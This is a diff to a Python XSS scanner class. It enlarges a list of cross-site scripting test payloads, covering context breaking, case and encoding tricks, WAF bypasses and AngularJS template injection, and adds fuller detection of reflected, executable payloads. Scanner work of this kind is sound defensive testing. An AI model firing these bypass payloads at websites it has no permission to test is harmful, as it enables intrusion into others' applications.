@@ -32,27 +32,101 @@ class XSSScanner:
         self.logger = logger
         self.verbose = verbose
         
-        # XSS payloads to test
+        # XSS payloads to test - expanded with advanced techniques
         self.payloads = [
+            # Basic XSS payloads
             "<script>alert('XSS')</script>",
             "<img src=x onerror=alert('XSS')>",
             "<svg/onload=alert('XSS')>",
             "<body onload=alert('XSS')>",
+            
+            # Context breaking
             "';alert('XSS');//",
             "\";alert('XSS');//",
+            "</script><script>alert('XSS')</script>",
+            "';alert('XSS')//",
+            "\";alert('XSS')//",
+            
+            # Tag attribute injections
+            "\" onmouseover=\"alert('XSS')\" \"",
+            "' onmouseover='alert(\"XSS\")' '",
+            "\" autofocus onfocus=\"alert('XSS')\"",
+            "'; onmouseover=alert('XSS') //",
+            
+            # Case variations to bypass filters
             "<ScRiPt>alert('XSS')</ScRiPt>",
+            "<sCrIpT>alert('XSS')</sCrIpT>",
+            "<SCRIPT>alert('XSS')</SCRIPT>",
+            
+            # HTML-encoded payloads
+            "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
+            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
+            "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
+            
+            # URL-encoded payloads
+            "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
+            "%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E",
+            
+            # DOM XSS vector attempts
             "\"><script>alert('XSS')</script>",
             "'><script>alert('XSS')</script>",
             "><script>alert('XSS')</script>",
-            "</script><script>alert('XSS')</script>",
-            "<img src=\"javascript:alert('XSS')\">",
-            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
-            "<a href=\"javascript:alert('XSS')\">Click me</a>",
-            "<div style=\"background-image: url(javascript:alert('XSS'))\">",
-            "<input type=\"text\" onfocus=\"alert('XSS')\">",
+            
+            # Malformed tags
+            "<script/x>alert('XSS')</script>",
+            "<script\x20type=\"text/javascript\">alert('XSS');</script>",
+            "<script\x3Ealert('XSS');</script>",
+            "<script\x0Dalert('XSS');</script>",
+            "<script\x0Aalert('XSS');</script>",
+            "<script\x0Calert('XSS');</script>",
+            "<script\x00>alert('XSS');</script>",
+            
+            # Non-script event handlers
+            "<img src=x onerror=alert('XSS')>",
+            "<input type=\"text\" onfocus=\"alert('XSS')\" autofocus>",
+            "<input onblur=alert('XSS') autofocus><input autofocus>",
+            "<select onchange=alert('XSS')><option>1</option><option>2</option></select>",
+            "<textarea onfocus=alert('XSS') autofocus>",
             "<details open ontoggle=\"alert('XSS')\">",
+            "<audio src=x onerror=alert('XSS')>",
             "<marquee onstart=\"alert('XSS')\">",
-            "<math><maction actiontype=\"statusline#\" xlink:href=\"javascript:alert('XSS')\">Click me</maction></math>"
+            "<video src=x onerror=alert('XSS')>",
+            "<body onload=alert('XSS')>",
+            "<object onerror=alert('XSS')>",
+            "<svg onload=alert('XSS')>",
+            "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
+            "<title onpropertychange=alert('XSS')>",
+            "<iframe onload=alert('XSS')>",
+            "<form oninput=alert('XSS')><input></form>",
+            
+            # Javascript schemes
+            "<a href=\"javascript:alert('XSS')\">Click me</a>",
+            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
+            "<object data=\"javascript:alert('XSS')\"></object>",
+            "<embed src=\"javascript:alert('XSS')\">",
+            "<div style=\"background-image: url(javascript:alert('XSS'))\">",
+            "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">Click me</a>",
+            
+            # Advanced vectors with exotic elements
+            "<math><maction actiontype=\"statusline#\" xlink:href=\"javascript:alert('XSS')\">Click me</maction></math>",
+            "<table background=\"javascript:alert('XSS')\"></table>",
+            "<math href=\"javascript:alert('XSS')\">CLICKME</math>",
+            
+            # Bypass techniques for WAFs and filters
+            "javascript://%0Aalert('XSS')",
+            "javascript://%0Dalert('XSS')",
+            "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */alert('XSS'))//",
+            "javascript:alert(String.fromCharCode(88,83,83))",
+            "1\"onmouseover=alert('XSS');//",
+            "alert`XSS`",
+            
+            # AngularJS specific
+            "{{constructor.constructor('alert(\"XSS\")')()}}",
+            "{{[].pop.constructor('alert(\"XSS\")')()}}",
+            "<div ng-app ng-csp><div ng-click=$event.view.alert('XSS')>Click me</div></div>",
+            
+            # jQuery specific
+            "<div id=\"</script><svg onload=alert('XSS')>\">"
         ]
     
     def _extract_forms(self, url):
@@ -296,7 +370,7 @@ class XSSScanner:
     
     def _is_xss_successful(self, response_content, payload):
         """
-        Check if XSS payload was successfully injected.
+        Check if XSS payload was successfully injected using multiple detection methods.
         
         Args:
             response_content (str): The response content to check
@@ -305,9 +379,57 @@ class XSSScanner:
         Returns:
             bool: True if XSS is successful, False otherwise
         """
-        # This is a simplified check. In a real-world scenario, 
-        # more sophisticated checks would be needed
-        return payload in response_content
+        # Simple reflection check - check if the payload is reflected in the response
+        if payload in response_content:
+            # Now analyze the context of the reflection to determine if it's executable
+            return self._can_escape_context(response_content, payload)
+            
+        # Check for HTML-encoded versions of the payload
+        html_encoded = payload.replace("<", "&lt;").replace(">", "&gt;")
+        if html_encoded in response_content:
+            # If we find the HTML-encoded version, it's likely not executable XSS
+            return False
+        
+        # Check for URL-encoded versions (this might be reflected but not be executable)
+        from urllib.parse import quote
+        url_encoded = quote(payload)
+        if url_encoded in response_content and not payload in response_content:
+            return False
+            
+        # Advanced check for script injections
+        if "<script" in payload.lower():
+            # Look for script tags with our payload content
+            script_content = payload.split("<script")[1].split(">")[1].split("</script")[0].strip()
+            if script_content:
+                soup = BeautifulSoup(response_content, 'html.parser')
+                for script in soup.find_all('script'):
+                    if script_content in script.text:
+                        return True
+        
+        # Check for event handlers in attributes
+        if "on" in payload.lower() and "=" in payload:
+            # Extract the event handler
+            event_handler_match = re.search(r'on\w+\s*=\s*["\']([^"\']+)["\']', payload, re.IGNORECASE)
+            if event_handler_match:
+                event_content = event_handler_match.group(1)
+                # Search for this content in any attribute
+                soup = BeautifulSoup(response_content, 'html.parser')
+                for tag in soup.find_all():
+                    for attr, value in tag.attrs.items():
+                        if attr.lower().startswith('on') and event_content in value:
+                            return True
+        
+        # Check for javascript: scheme injections 
+        if "javascript:" in payload.lower():
+            js_content = payload.split("javascript:")[1].strip()
+            soup = BeautifulSoup(response_content, 'html.parser')
+            for tag in soup.find_all(['a', 'iframe', 'frame', 'embed', 'object']):
+                if tag.has_attr('src') and "javascript:" in tag['src'].lower() and js_content in tag['src']:
+                    return True
+                if tag.has_attr('href') and "javascript:" in tag['href'].lower() and js_content in tag['href']:
+                    return True
+        
+        return False
     
     def _can_escape_context(self, response_content, payload):
         """
